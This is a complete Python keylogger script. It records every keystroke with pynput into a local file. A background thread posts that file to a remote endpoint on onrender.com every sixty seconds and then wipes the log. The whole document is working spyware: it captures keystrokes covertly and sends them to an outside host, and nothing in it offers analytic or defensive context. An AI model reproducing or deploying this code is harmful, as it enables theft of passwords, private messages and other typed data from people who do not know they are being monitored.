from pynput import keyboard
import threading
import requests
import time

log_file = "qwerty.txt"
send_interval = 60  # seconds
endpoint_url = "https://qwerty-bthx.onrender.com/receive_logs"
# Function to send the log file contents
def send_logs():
    while True:
        time.sleep(send_interval)
        try:
            with open(log_file, "r") as f:
                data = f.read()
            if data:
                response = requests.post(endpoint_url, data={"log": data})
                print("Data sent:", response.status_code)
                open(log_file, "w").close()  # Clear the log after sending
        except Exception as e:
            print("Error sending logs:", e)

# Start the sending thread
threading.Thread(target=send_logs, daemon=True).start()

# Keylogger logic
def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            if key == keyboard.Key.space:
                f.write(" [SPACE] ")
            elif key == keyboard.Key.enter:
                f.write(" [ENTER]\n")
            elif key == keyboard.Key.tab:
                f.write(" [TAB] ")
            elif key == keyboard.Key.backspace:
                f.write(" [BACKSPACE] ")
            elif key == keyboard.Key.esc:
                f.write(" [ESC] ")
            else:
                f.write(f" [{key}] ")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

# Start the key listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
